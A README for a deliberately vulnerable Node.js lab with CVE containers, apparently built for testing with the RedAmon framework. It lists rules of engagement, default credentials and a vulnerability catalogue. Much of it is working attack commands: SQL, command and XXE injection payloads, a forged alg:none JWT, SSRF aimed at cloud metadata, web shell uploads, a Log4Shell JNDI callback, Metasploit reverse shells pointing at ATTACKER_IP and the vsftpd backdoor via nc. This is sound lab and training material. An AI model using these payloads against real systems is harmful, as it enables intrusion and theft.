# DVWS-Node + CVE Lab -- Vulnerable Target Environment

Modern Node.js vulnerable application (32 vuln categories) plus CVE Lab containers with real Metasploit-exploitable CVEs.

> **WARNING**: Intentionally vulnerable -- for authorized testing only.

---

## Public Test Server -- Rules of Engagement

A public instance of this environment is available at **http://gpigs.devergolabs.com** for testing with RedAmon.

### Acceptable Use Policy

By accessing this server you agree to the following terms:

1. **RedAmon-only testing** -- This server is provided exclusively for testing with the [RedAmon](https://github.com/samugit83/redamon) framework. Manual exploitation, third-party scanners, and automated tools other than RedAmon are not authorized.

2. **Scope** -- You may only interact with the services listed in the target service map below (ports 80, 4000, 9090, 3306, 27017, 8080, 8888, 21/6200). All other ports, IPs, and infrastructure behind this server are out of scope.

3. **No lateral movement** -- Do not attempt to pivot from this server to other systems, networks, or AWS infrastructure (including the EC2 metadata service at 169.254.169.254).

4. **No denial of service** -- Do not perform load testing, resource exhaustion, or any action intended to degrade availability. This includes XML bombs (Billion Laughs), fork bombs, and excessive concurrent connections.

5. **No data exfiltration beyond the server** -- You may read intentionally planted vulnerable data (credentials, files, database contents). Do not exfiltrate data to external servers, set up reverse shells to your own infrastructure, or establish persistent backdoors.

6. **No modification of the environment** -- Do not delete databases, drop tables, modify other users' data, or alter the running services in ways that affect other testers. The environment resets periodically, but destructive actions impact concurrent users.

7. **Responsible disclosure** -- If you discover a vulnerability in RedAmon itself (not in the intentionally vulnerable target), report it via [GitHub Issues](https://github.com/samugit83/redamon/issues) or email. Do not exploit vulnerabilities in RedAmon's infrastructure.

8. **Legal compliance** -- You are solely responsible for ensuring your testing complies with all applicable laws in your jurisdiction. Unauthorized access to computer systems is illegal in most countries regardless of the target's intended vulnerability.

9. **No warranty / liability** -- This server is provided "as is" for educational purposes. Devergolabs assumes no liability for any damages arising from your use of this server. Access may be revoked at any time without notice.

10. **Logging and monitoring** -- All traffic to this server is logged. IP addresses and request data are recorded for security monitoring and abuse prevention. By accessing this server, you consent to this logging.

### Violation consequences

Violations of these rules will result in immediate IP ban and may be reported to the relevant ISP or law enforcement authority. We reserve the right to modify these rules at any time.

---

## Services (7 containers)

| Service | Port | Technology | Vulns |
|---------|------|-----------|-------|
| DVWS-Node REST + SOAP | 80 | Node.js, Express | SQLi, XXE, cmd injection, IDOR, etc. |
| GraphQL Playground | 4000 | Apollo Server | IDOR, introspection, file write |
| XML-RPC | 9090 | xmlrpc module | SSRF |
| MySQL 8 | 3306 | MySQL 8.4 | Exposed, scannable |
| MongoDB 4.0.4 | 27017 | MongoDB (2018) | No auth, known CVEs |
| Tomcat 8.5.19 | 8080 | Apache Tomcat | CVE-2017-12617 (PUT RCE) |
| Log4Shell | 8888 | Spring Boot + Log4j 2.14.1 | CVE-2021-44228 (JNDI RCE) |
| vsftpd 2.3.4 | 21, 6200 | vsftpd | CVE-2011-2523 (backdoor shell) |

## Default Credentials

| Service | Username | Password | Role |
|---------|----------|----------|------|
| DVWS-Node | `admin` | `letmein` | Admin |
| DVWS-Node | `test` | `test` | Regular user |
| MySQL | `root` | `mysecretpassword` | Root |
| MongoDB | -- | -- | No auth required |

> DVWS-Node databases are reset on every container restart (startup_script.js re-seeds).

---

## Vulnerability Catalog (32 Categories)

### Injection
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 1 | SQL Injection | `/api/v2/passphrase/:username` | GET |
| 2 | SQL Injection (GraphQL) | `:4000` -- `getPassphrase` query | POST |
| 3 | NoSQL Injection | `/api/v2/notesearch` | POST |
| 4 | OS Command Injection | `/api/v2/sysinfo/:command` | GET |
| 5 | XXE Injection (XML export) | `/api/v2/users/profile/export/xml` | GET/POST |
| 6 | XXE Injection (XML import) | `/api/v2/users/profile/import/xml` | POST |
| 7 | XXE Injection (notes import) | `/api/v2/notes/import/xml` | POST |
| 8 | XXE Injection (SOAP) | `/dvwsuserservice` | POST |
| 9 | XPath Injection | various | - |
| 10 | LDAP Injection | `/api/v2/users/ldap-search` | GET/POST |
| 11 | XML Injection | various | - |
| 12 | SOAP Injection | `/dvwsuserservice` | POST |
| 13 | CRLF Injection | various | - |

### Broken Access Control
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 14 | BOLA/IDOR (notes) | `/api/v2/notes/:noteId` | GET/PUT/DELETE |
| 15 | BOLA/IDOR (GraphQL) | `:4000` -- `userFindbyId`, `noteFindbyId` | POST |
| 16 | Broken Admin Access | `/api/v2/admin/logs` | GET |
| 17 | Mass Assignment | `/api/v2/users`, `/api/v2/admin/create-user` | POST |
| 18 | Horizontal Privilege Escalation | `/api/v2/passphrase/:username` | GET |

### Authentication & Session
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 19 | JWT `alg:none` bypass | `/api/v2/login` | POST |
| 20 | JWT weak secret (`access`) | `/api/v2/login` | POST |
| 21 | Brute force (weak rate limit) | `/api/v2/login` | POST |

### SSRF & Network
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 22 | SSRF (file download) | `/api/download` | POST |
| 23 | SSRF (XML-RPC) | `:9090/xmlrpc` -- `dvws.CheckUptime` | POST |

### File & Data
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 24 | Unrestricted File Upload | `/api/upload` | POST |
| 25 | Arbitrary File Write (GraphQL) | `:4000` -- `updateUserUploadFile` mutation | POST |
| 26 | Path Traversal | `/api/upload` | GET |
| 27 | Sensitive Data Exposure | `/api/v2/notesearch/all`, `/api/v2/export` | GET/POST |

### Misconfiguration & Other
| # | Vulnerability | Endpoint | Method |
|---|--------------|----------|--------|
| 28 | GraphQL Introspection | `:4000` | POST |
| 29 | GraphQL Batching (brute force) | `:4000` | POST |
| 30 | Open Redirect | `/api/v2/users/logout/:redirect` | GET |
| 31 | CORS Misconfiguration | various | - |
| 32 | Information Disclosure | `/api/v2/info`, `/openAPI-spec.json`, `/api-docs` | GET |

---

## EC2 Deployment (One Command)

### 1. Launch EC2
- **AMI**: Ubuntu 22.04 or Amazon Linux 2023
- **Type**: t2.micro (or larger for faster builds)
- **Security Group**: SSH (22) + TCP 80 + TCP 4000 + TCP 9090 -- your IP only

### 2. Deploy (first time or any update)

```bash
# from folder /redamon
scp -i ~/.ssh/guinea_pigs.pem -r guinea_pigs/dvws-node/setup.sh guinea_pigs/dvws-node/xss-lab ubuntu@15.160.68.117:~/ && ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "bash ~/setup.sh"
```

### 3. Wipe & Clean (remove everything)

```bash
# from folder /redamon
ssh -i ~/.ssh/guinea_pigs.pem ubuntu@15.160.68.117 "cd ~/dvws-node && sudo docker-compose down --volumes && sudo docker system prune -a -f --volumes && rm -rf ~/dvws-node"
```

---

## Services & Ports

| Port | Service | URL |
|------|---------|-----|
| 80 | REST API + SOAP + Swagger UI | `http://<IP>/` |
| 80 | Swagger UI | `http://<IP>/api-docs` |
| 80 | OpenAPI Spec | `http://<IP>/openAPI-spec.json` |
| 80 | SOAP WSDL | `http://<IP>/dvwsuserservice?wsdl` |
| 4000 | GraphQL Playground | `http://<IP>:4000/` |
| 9090 | XML-RPC | `http://<IP>:9090/xmlrpc` |

---

## Test Vulnerabilities

### Authenticate (get JWT token)

```bash
# Login as admin
TOKEN=$(curl -s -X POST http://<IP>/api/v2/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"letmein"}' | jq -r '.token')

echo $TOKEN
```

### SQL Injection

```bash
# SQLi on passphrase endpoint (requires auth)
curl -s http://<IP>/api/v2/passphrase/admin%27%20OR%20%271%27%3D%271 \
  -H "Authorization: Bearer $TOKEN"
```

### OS Command Injection

```bash
# Execute 'id' command on the server (requires auth)
curl -s http://<IP>/api/v2/sysinfo/id \
  -H "Authorization: Bearer $TOKEN"

# Chained command
curl -s http://<IP>/api/v2/sysinfo/id%3Bcat%20/etc/passwd \
  -H "Authorization: Bearer $TOKEN"
```

### XXE Injection

```bash
# XXE to read /etc/passwd
curl -s -X POST http://<IP>/api/v2/users/profile/import/xml \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>'
```

### NoSQL Injection

```bash
# NoSQL injection on note search
curl -s -X POST http://<IP>/api/v2/notesearch \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"search":{"$gt":""}}'
```

### JWT alg:none Bypass

```bash
# Craft a token with alg:none (no signature needed)
# Header: {"alg":"none","typ":"JWT"}
# Payload: {"username":"admin","admin":true}
FORGED=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=').$(echo -n '{"username":"admin","admin":true}' | base64 -w0 | tr '+/' '-_' | tr -d '=').

curl -s http://<IP>/api/v2/admin/logs \
  -H "Authorization: Bearer $FORGED"
```

### SSRF via XML-RPC

```bash
# SSRF: make the server fetch an arbitrary URL
curl -s -X POST http://<IP>:9090/xmlrpc \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>dvws.CheckUptime</methodName><params><param><value><string>http://169.254.169.254/latest/meta-data/</string></value></param></params></methodCall>'
```

### GraphQL Introspection

```bash
# Dump entire schema
curl -s -X POST http://<IP>:4000/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}'
```

### GraphQL IDOR

```bash
# Access any user by ID
curl -s -X POST http://<IP>:4000/ \
  -H "Content-Type: application/json" \
  -d '{"query":"{ userFindbyId(id: \"1\") { username email admin } }"}'
```

### BOLA/IDOR on Notes

```bash
# Access another user's note by guessing noteId
curl -s http://<IP>/api/v2/notes/<noteId> \
  -H "Authorization: Bearer $TOKEN"
```

### Open Redirect

```bash
curl -v http://<IP>/api/v2/users/logout/https://evil.com
# Observe 302 redirect to https://evil.com
```

### Unrestricted File Upload

```bash
# Upload a web shell
curl -s -X POST http://<IP>/api/upload \
  -F "file=@shell.php"
```

---

## CVE Lab -- Metasploit-Exploitable Services

### CVE-2017-12617: Apache Tomcat PUT RCE (port 8080)

Tomcat 8.5.19 with `readonly=false` on the DefaultServlet. Upload a JSP webshell via HTTP PUT.

```bash
# Upload a JSP shell via PUT
curl -X PUT http://<IP>:8080/shell.jsp -d '<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>'

# Metasploit
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS <IP>
set RPORT 8080
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <ATTACKER_IP>
exploit
```

### CVE-2021-44228: Log4Shell JNDI RCE (port 8888)

Spring Boot app with Log4j 2.14.1. Inject `${jndi:ldap://...}` in any HTTP header.

```bash
# Test with interactsh callback
curl http://<IP>:8888/ -H 'X-Api-Version: ${jndi:ldap://CALLBACK_HOST/a}'

# Metasploit
use exploit/multi/http/log4shell_header_injection
set RHOSTS <IP>
set RPORT 8888
set TARGETURI /
set HTTP_HEADER X-Api-Version
set PAYLOAD java/shell_reverse_tcp
set LHOST <ATTACKER_IP>
exploit
```

### CVE-2011-2523: vsftpd 2.3.4 Backdoor (port 21 + 6200)

Send a username ending in `:)` to trigger the backdoor, opening a root shell on port 6200.

```bash
# Metasploit (one-click root shell)
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
exploit

# Manual
echo -e "USER attacker:)\nPASS anything" | nc <IP> 21 &
nc <IP> 6200
# id -> uid=0(root)
```

### Exposed Databases

```bash
# MongoDB 4.0.4 -- no authentication
mongosh mongodb://<IP>:27017/node-dvws --eval "db.users.find()"

# MySQL 8.4
mysql -h <IP> -u root -pmysecretpassword -e "SELECT * FROM dvws_sqldb.passphrases"
```

---

## Architecture

```
                          ATTACKER
                             |
    +-------+-------+-------+-------+-------+-------+
    |       |       |       |       |       |       |
  :80     :4000   :9090   :8080   :8888    :21    :3306/:27017
    |       |       |       |       |       |       |
+---v--+ +-v---+ +-v---+ +-v----+ +v----+ +v----+ +v--------+
|REST  | |Graph| |XML  | |Tomcat| |Log4 | |vsFTP| |MySQL    |
|SOAP  | |QL   | |RPC  | |8.5.19| |Shell| |2.3.4| |MongoDB  |
|Swagg.| |     | |     | |      | |     | |     | |         |
+--+---+ +--+--+ +--+--+ +------+ +-----+ +-----+ +---------+
   |        |        |     CVE-       CVE-    CVE-    Exposed
   +---+----+---+----+     2017-      2021-   2011-   DBs
       |        |           12617      44228   2523
  +----v---+ +--v------+
  |MySQL 8 | |MongoDB  |
  |SQLi    | |4.0.4    |
  |targets | |NoSQLi   |
  +--------+ +---------+
```

---

## AWS Target Group Health Check

| Setting | Value |
|---------|-------|
| **Path** | `/api/v1/info` |
| **Port** | `80` |
| **Protocol** | `HTTP` |
| **Success codes** | `200` |

---

## References

- [DVWS-Node GitHub](https://github.com/snoopysecurity/dvws-node)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)

---

## Cleanup

```bash
cd ~/dvws-node
sudo docker-compose down --volumes
sudo docker system prune -a -f --volumes
rm -rf ~/dvws-node
# Then terminate EC2 instance if no longer needed
```
